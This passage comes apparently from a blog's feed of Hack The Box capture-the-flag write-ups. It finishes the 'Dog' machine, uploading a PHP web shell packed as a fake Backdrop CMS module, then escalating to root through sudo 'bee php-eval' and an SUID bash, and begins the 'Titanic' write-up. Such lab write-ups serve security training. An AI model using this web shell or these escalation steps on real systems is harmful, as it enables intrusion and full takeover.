&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">input&lt;/span> &lt;span class="kd">type&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;SUBMIT&amp;#34;&lt;/span> &lt;span class="nx">value&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="s">&amp;#34;Execute&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">form&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">isset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="nx">_GET&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nx">cmd&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">pre&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">name&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Block&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">description&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Controls&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">visual&lt;/span> &lt;span class="nx">building&lt;/span> &lt;span class="nx">blocks&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="nx">is&lt;/span> &lt;span class="nx">constructed&lt;/span> &lt;span class="nx">with&lt;/span>&lt;span class="p">.&lt;/span> &lt;span class="nx">Blocks&lt;/span> &lt;span class="nx">are&lt;/span> &lt;span class="nx">boxes&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">content&lt;/span> &lt;span class="nx">rendered&lt;/span> &lt;span class="nx">into&lt;/span> &lt;span class="nx">an&lt;/span> &lt;span class="nx">area&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">or&lt;/span> &lt;span class="nx">region&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">of&lt;/span> &lt;span class="nx">a&lt;/span> &lt;span class="nx">web&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Layouts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Blocks&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">tags&lt;/span>&lt;span class="p">[]&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">Site&lt;/span> &lt;span class="nx">Architecture&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">BACKDROP_VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">backdrop&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.&lt;/span>&lt;span class="nx">x&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">configure&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">admin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">structure&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">block&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">;&lt;/span> &lt;span class="nx">Added&lt;/span> &lt;span class="nx">by&lt;/span> &lt;span class="nx">Backdrop&lt;/span> &lt;span class="nx">CMS&lt;/span> &lt;span class="nx">packaging&lt;/span> &lt;span class="nx">script&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="mi">2024&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">03&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">07&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">project&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">backdrop&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">version&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mf">1.27.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">timestamp&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="mi">1709862662&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">tar&lt;/span> &lt;span class="nx">cvf&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">tar&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span> &lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">php&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">shell&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">info&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar.PNG"
width="986"
height="653"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_162520f382904bda.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_shell_tar_hu_4f8761190ad46300.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="150"
data-flex-basis="362px"
>
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed.PNG"
width="500"
height="356"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_caf41748980a33a1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_module_installed_hu_a0f0147f5be960fb.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="140"
data-flex-basis="337px"
>&lt;/p>
&lt;p>Even if this new module is not listed in the list of installed modules, we can access it through &lt;code>/modules/shell/shell.php&lt;/code>, as specified in the &lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>exploit&lt;/a>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE.PNG"
width="836"
height="124"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_5d37d8ed15da13e1.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_RCE_hu_63d10529c5e5d6f1.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="674"
data-flex-basis="1618px"
>&lt;/p>
&lt;p>In the home directory, we can find two users, &lt;code>jobert&lt;/code> and &lt;code>johncusack&lt;/code>.
&lt;img src="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users.PNG"
width="774"
height="170"
srcset="https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_eb4f5371c87eae46.PNG 480w, https://01MI.github.io/p/dog-htb-writeup-linux-easy/Backdrop_users_hu_9389f974789777ed.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="455"
data-flex-basis="1092px"
>&lt;br>
Using the previously discovered password &lt;code>BackDropJ2024DS2024&lt;/code>, we gain SSH access to the machine as &lt;code>johncusack&lt;/code> and are able to retrieve the &lt;code>user.txt&lt;/code> flag.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="sudo-misconfiguration">Sudo misconfiguration
&lt;/h3>&lt;p>&lt;code>Johncusack&lt;/code> can use &lt;code>bee&lt;/code> CLI as &lt;code>root&lt;/code> via sudo.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="hl">&lt;span class="lnt">7
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="nx">sudo&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">johncusack&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">ALL&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="nx">ALL&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>This CLI &amp;ldquo;allows developers to interact with Backdrop sites&amp;rdquo; as specified on their &lt;a class="link" href="https://github.com/backdrop-contrib/bee" target="_blank" rel="noopener"
>GitHub&lt;/a>.&lt;br>
As we can see in the documentation, we can execute PHP code.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">bee&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ev&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">Evaluate&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">run&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">execute&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">arbitrary&lt;/span> &lt;span class="nx">PHP&lt;/span> &lt;span class="nx">code&lt;/span> &lt;span class="nx">after&lt;/span> &lt;span class="nx">bootstrapping&lt;/span> &lt;span class="nx">Backdrop&lt;/span>&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;p>First, we are going to move to &lt;code>/var/www/html&lt;/code> so &lt;code>bee&lt;/code> can interact with our backdrop site.&lt;br>
Then, we set the SUID flag to &lt;code>/bin/bash&lt;/code> and get a root shell in order to read the &lt;code>root.txt&lt;/code> flag.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
&lt;/span>&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
&lt;/span>&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="hl">&lt;span class="lnt">8
&lt;/span>&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bee&lt;/span> &lt;span class="nx">php&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">eval&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>&lt;span class="nf">exec&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;chmod u+s /bin/bash&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">rwsr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">xr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="mi">1183448&lt;/span> &lt;span class="nx">Apr&lt;/span> &lt;span class="mi">18&lt;/span> &lt;span class="mi">2022&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">johncusack&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">dog&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">html&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">euid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">groups&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1001&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">johncusack&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.0&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="resources">Resources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener"
>GitHack&lt;/a>&lt;br>
&lt;a class="link" href="https://www.exploit-db.com/exploits/52021" target="_blank" rel="noopener"
>RCE exploit - Backdrop v1.27.1&lt;/a>&lt;/p>&lt;/blockquote></description></item><item><title>Titanic - Linux Easy - HTB Writeup</title><link>https://01MI.github.io/p/titanic-htb-writeup-linux-easy/</link><pubDate>Sat, 21 Jun 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/titanic-htb-writeup-linux-easy/</guid><description>&lt;img src="https://01MI.github.io/p/titanic-htb-writeup-linux-easy/Titanic.PNG" alt="Featured image of post Titanic - Linux Easy - HTB Writeup" />&lt;h2 id="summary">Summary
&lt;/h2>&lt;p>User: Path traversal on the titanic.htb application&lt;br>
Root: Arbitrary code execution via CVE-2024-41817(ImageMagick).&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>Using an nmap scan, we can identify a web service on port 80 and SSH exposed on port 22.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
&lt;/span>&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 7
&lt;/span>&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="mi">80&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">22&lt;/span> &lt;span class="mf">10.129.175.139&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span> &lt;span class="nx">VERSION&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">OpenSSH&lt;/span> &lt;span class="mf">8.9&lt;/span>&lt;span class="nx">p1&lt;/span> &lt;span class="nx">Ubuntu&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="nx">ubuntu0&lt;/span>&lt;span class="mf">.10&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">Ubuntu&lt;/span> &lt;span class="nx">Linux&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">protocol&lt;/span> &lt;span class="mf">2.0&lt;/span>&lt;span class="p">)&lt;/span>
